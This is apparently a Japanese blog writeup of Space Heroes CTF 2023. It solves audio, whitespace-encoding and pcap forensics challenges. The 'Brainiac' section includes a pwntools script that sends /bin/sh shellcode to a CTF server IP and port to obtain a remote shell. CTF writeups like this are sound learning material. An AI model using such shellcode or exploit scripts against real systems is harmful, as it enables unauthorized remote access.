---
title: "Space Heroes CTF 2023 Writeup"
date: 2023-04-24T07:00:00+09:00
lastmod: 2023-04-24T07:00:00+09:00
draft: false
keywords: []
description: ""
tags: ["CTF"]
categories: ["CTF"]
author: ""
---
{{% right %}}
<a href="https://translate.google.com/translate?hl=en&sl=ja&tl=en&u=https%3A%2F%2Fcaptureamerica.github.io%2Fwriteups%2Fpost%2Fspaceheroes_ctf_2023%2F">
<img src="https://captureamerica.github.io/writeups/img/En.png" alt="English">
</a>
{{% /right %}}

URL: [https://spaceheroes.ctfd.io/challenges](https://spaceheroes.ctfd.io/challenges)
<br /><br />

2252ポイントで、最終順位は125番でした。

<img src="https://captureamerica.github.io/writeups/img/spaceheroes_ctf_2023_score1.png" alt="spaceheroes_ctf_2023_score1.png"> <br />

<br />

<img src="https://captureamerica.github.io/writeups/img/spaceheroes_ctf_2023_score2.png" alt="spaceheroes_ctf_2023_score2.png">

<br /><br />
以下は、チャレンジ一覧です。

（見にくいですが、チェックが入っているのが解けたチャレンジです）

<img src="https://captureamerica.github.io/writeups/img/spaceheroes_ctf_2023_chall1.png" alt="spaceheroes_ctf_2023_chall1.png">

<img src="https://captureamerica.github.io/writeups/img/spaceheroes_ctf_2023_chall2.png" alt="spaceheroes_ctf_2023_chall2.png">

<img src="https://captureamerica.github.io/writeups/img/spaceheroes_ctf_2023_chall3.png" alt="spaceheroes_ctf_2023_chall3.png">


<br /><br />


## [Forensics]: My God, it's full of .- ... -.-. .. .. (839 points)
- - -
### Challenge
> If sound can't travel in a vacuum then how did a microphone pick this up in space unless space is a made up concept designed to make us fear leaving Earth and joining with Xenu and the Galactic Confederacy?

Attachments:

- signal.wav

<br />
### Solution

WAV形式ファイルなので、Audacityで開きます。

再生すると、かすかにモールス信号のような音が聞こえます。

<br />

以下のようにすると、視覚的にわかりやすかったです。
1. スペクトラム表示にする
2. select allで色を反転する
3. 拡大する

<img src="https://captureamerica.github.io/writeups/img/spaceheroes_ctf_2023_Audacity.png" alt="spaceheroes_ctf_2023_Audacity.png"> <br />

<br />

ここからは、目視でデータをテキストにしていきます。

<pre>
.---..-- .--.-... .--...-- .---.-.. .--..--. .----.-- .-..---. ..--.... ..-..... ..--...- ..-..... .--...-- ..--.-.. .--.---. ..-..... .-..-... ..--..-- ..--.-.. .---..-. ..-..... .---.-.- ..-..... ..---... ..--..-- ..--..-- .-.-.... .-.----- ..---... ..--.... ..--.... .---.... ..-.-... .-..-..- .--.---. ..-.-..- ..-..... ..----.. ..-..... ..-.---- .--..-.. .--..-.- .---.--. ..-.---- .--.---. .---.-.- .--.--.. .--.--.. .---..-- .---.... .--....- .--...-- .--..-.- .-----.-
</pre>


ただし、これはモールス信号として処理をすると、フラグ文字列にはなりません。

チャレンジタイトルに出てくるモールス信号っぽい文字列（`.- ... -.-. .. ..` ==> "ASCII"）は、完全にひっかけです。

<br />

8文字ずつ分かれているので、バイナリデータだと予想して「0」と「1」に変えてみました。

<pre>
01110011 01101000 01100011 01110100 01100110 01111011 01001110 00110000 00100000 00110001 00100000 01100011 00110100 01101110 00100000 01001000 00110011 00110100 01110010 00100000 01110101 00100000 00111000 00110011 00110011 01010000 01011111 00111000 00110000 00110000 01110000 00101000 01001001 01101110 00101001 00100000 00111100 00100000 00101111 01100100 01100101 01110110 00101111 01101110 01110101 01101100 01101100 01110011 01110000 01100001 01100011 01100101 01111101
</pre>

<br />

予想通り、ちゃんとした文字になりました。

<br />

Flag: `shctf{N0 1 c4n H34r u 833P_800p(In) < /dev/nullspace}`

<br />

"No one can hear you 833P_800p(In)"。どういう意味だろう。自分は、いちおう聞こえたんだけど、普通の人には無い聴覚を持っているのかな。



<br /><br />
<br /><br />
## [Crypto]: Bynary Encoding (148 points)
- - -
### Challenge
> Starfleet has received a transmission from Bynaus. However, the message apears to be blank. Is there some kind of hidden message here?

Attachments:

- transmission.txt


<br />
### Solution

transmission.txt の中身は以下のようになっています。

<pre>
$ xxd transmission.txt
00000000: 2009 0909 2020 0909 0a20 0909 2009 2020   ...  ... .. .
00000010: 200a 2009 0920 2020 0909 0a20 0909 0920   . ..   ... ...
00000020: 0920 200a 2009 0920 2009 0920 0a20 0909  .  . ..  .. . ..
00000030: 0909 2009 090a 2009 0920 2020 2009 0a20  .. ... ..    ..
00000040: 0920 0909 0909 090a 2009 0920 2020 0920  . ...... ..   .
00000050: 0a20 0909 2009 0920 200a 2020 0909 2020  . .. ..  .  ..
00000060: 2009 0a20 0909 2009 0909 200a 2009 0920   .. .. ... . ..
00000070: 2009 2020 0a20 0920 0909 0909 090a 2009   .  . . ...... .
00000080: 0920 0909 2009 0a20 2009 0920 0920 200a  . .. ..  .. .  .
00000090: 2009 0920 0909 0920 0a20 0920 0909 0909   .. ... . . ....
000000a0: 090a 2009 0909 2009 2020 0a20 2009 0920  .. ... .  .  ..
000000b0: 2009 090a 2009 0920 2020 2009 0a20 0909   ... ..    .. ..
000000c0: 2020 2009 090a 2009 0920 0920 2020 0a20     ... .. .   .
000000d0: 0909 2009 2020 090a 2009 0920 0909 0920  .. .  .. .. ...
000000e0: 0a20 0909 2020 0909 090a 2009 2009 0909  . ..  .... . ...
000000f0: 0909 0a20 0909 2020 2020 090a 2009 0920  ... ..    .. ..
00000100: 0909 0920 0a20 0920 0909 0909 090a 2020  ... . . ......
00000110: 0909 2009 2020 0a20 0909 2009 0909 200a  .. .  . .. ... .
00000120: 2009 0920 2009 2020 0a20 0909 0920 2009   ..  .  . ...  .
00000130: 200a 2020 0909 2020 2020 0a20 0909 2009   .  ..    . .. .
00000140: 2020 090a 2009 0920 2009 2020 0a20 0920    .. ..  .  . .
00000150: 0909 0909 090a 2009 0920 0920 2020 0a20  ...... .. .   .
00000160: 2009 0920 2020 200a 2009 0909 2009 0909   ..    . ... ...
00000170: 0a20 0920 0909 0909 090a 2009 0909 2009  . . ...... ... .
00000180: 2020 0a20 0909 2009 0909 090a 2009 2009    . .. ..... . .
00000190: 0909 0909 0a20 0909 0920 2020 200a 2009  ..... ...    . .
000001a0: 0920 2020 2009 0a20 2009 0920 2020 090a  .    ..  ..   ..
000001b0: 2009 0920 0909 0920 0a20 0909 0920 0920   .. ... . ... .
000001c0: 200a 2009 0909 0909 2009 0a               . ..... ..
</pre>


<br />

「20」、「09」、「0a」の3値があるので、最初、モールス信号なのかな、と思いました。

<br />

まずは、データ部分だけ1行にして取り出します。

<pre>
$ xxd -ps transmission.txt | tr -d "\n"; echo
20090909202009090a20090920092020200a20090920202009090a20090909200920200a20090920200909200a20090909092009090a20090920202020090a20092009090909090a20090920202009200a20090920090920200a20200909202020090a20090920090909200a20090920200920200a20092009090909090a20090920090920090a20200909200920200a20090920090909200a20092009090909090a20090909200920200a20200909202009090a20090920202020090a20090920202009090a20090920092020200a20090920092020090a20090920090909200a20090920200909090a20092009090909090a20090920202020090a20090920090909200a20092009090909090a20200909200920200a20090920090909200a20090920200920200a20090909202009200a20200909202020200a20090920092020090a20090920200920200a20092009090909090a20090920092020200a20200909202020200a20090909200909090a20092009090909090a20090909200920200a20090920090909090a20092009090909090a20090909202020200a20090920202020090a20200909202020090a20090920090909200a20090909200920200a20090909090920090a
</pre>

<br />

モールス信号のようにして、いろんなパターンを試しましたが、フラグは得られませんでした。

<pre>
.---..-- .--.-... .--...-- .---.-.. .--..--. .----.-- .--....- .-.----- .--...-. .--.--.. ..--...- .--.---. .--..-.. .-.----- .--.--.- ..--.-.. .--.---. .-.----- .---.-.. ..--..-- .--....- .--...-- .--.-... .--.-..- .--.---. .--..--- .-.----- .--....- .--.---. .-.----- ..--.-.. .--.---. .--..-.. .---..-. ..--.... .--.-..- .--..-.. .-.----- .--.-... ..--.... .---.--- .-.----- .---.-.. .--.---- .-.----- .---.... .--....- ..--...- .--.---. .---.-.. .-----.-
</pre>

<br />

ここで、一旦このチャレンジは中断して、前述のForensicsのsignal.wavを見ていたのですが、結局こっちのやつも同じでしたね。

たまたま、同じような問題がかぶっちゃったのかな。

8文字ずつ分かれているので、こちらもバイナリデータです。タイトルの「Bynary Encoding」からも「Binary」なのは予測できましたね。

<pre>
01110011 01101000 01100011 01110100 01100110 01111011 01100001 01011111 01100010 01101100 00110001 01101110 01100100 01011111 01101101 00110100 01101110 01011111 01110100 00110011 01100001 01100011 01101000 01101001 01101110 01100111 01011111 01100001 01101110 01011111 00110100 01101110 01100100 01110010 00110000 01101001 01100100 01011111 01101000 00110000 01110111 01011111 01110100 01101111 01011111 01110000 01100001 00110001 01101110 01110100 01111101
</pre>

<br />

Flag: `shctf{a_bl1nd_m4n_t3aching_an_4ndr0id_h0w_to_pa1nt}`



<br /><br />
<br /><br />
## [Forensics]: Brainiac (489 points)
- - -
### Challenge
> Brainiac has exploited a binary running on our server on the space station, thankfully the binary is still running but our data was stolen. We also were able to get a network traffic capture when Brainiac exploited our server. He also defaced the binary as well.
<br /><br />
The flag is on the server that is running.

Attachments:

- exploit.pcap


<br />
### Solution

Follow TCP Streamで以下が見つかります。

<img src="https://captureamerica.github.io/writeups/img/spaceheroes_ctf_2023_Brainiac.png" alt="spaceheroes_ctf_2023_Brainiac.png"> <br />

<br />

フラグはサーバー上にあるとのことで、pcapで見つかるIPアドレスとポートを使って `nc 165.227.210.30 16306` で実際に接続を試みてみると、確かにアクセスが可能なようです。

<br />

ということで、以下のコードを書いたら、シェルが取れました。

```Python
#!/usr/bin/env python
from pwn import *

s = remote('165.227.210.30', 16306)

payload = b'\x41\x59\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x73\x68\x00\x57\x54\x5f\x48\xc7\xc1\x80\x10\x40\x00\xff\xd1\x0a'
s.sendlineafter(">>>", payload)

payload = b'\x00\x00\x11\xca\x00\x00\x00\x00\x0a'
s.sendlineafter(">>>", payload)

payload = b'AAAAAAAA'
s.sendlineafter(">>>", payload)

s.interactive()
```

<br />

Flag: `shctf{1_4m_n0t_pr0gr4mm3d_t0_3xp3r13nc3_hum0r}`


<br /><br />
<br /><br />
## [Forensics]: Félicette (198 points)
- - -
### Challenge
> a cat in space, eating a croissant, while starting a revolution.

Attachments:

- chall.jpg.pcap

<br />
### Solution

pcapを開くと、1バイトデータを含んだEcho Requestが239351個並んでいます。

<br />

`tshark -r chall.jpg.pcap -T fields -e data` でデータを取り出したところ、バイナリデータが出てきて、中に`JFIF`も見つかったので、これでjpgファイルが取れると判断しました。

pcapのファイル名も、`chall.jpg.pcap`ですしね。

<br />

ということで、

<pre>
tshark -r chall.jpg.pcap -T fields -e data | tr -d "\n" | xxd -r -p > chall.jpg
</pre>

<br />

画像を開くと、フラグが書かれていました。

<br />

Flag: `shctf{look_at_da_kitty}`

<br /><br />
<br /><br />
- - -
<br /><br />
<br /><br />
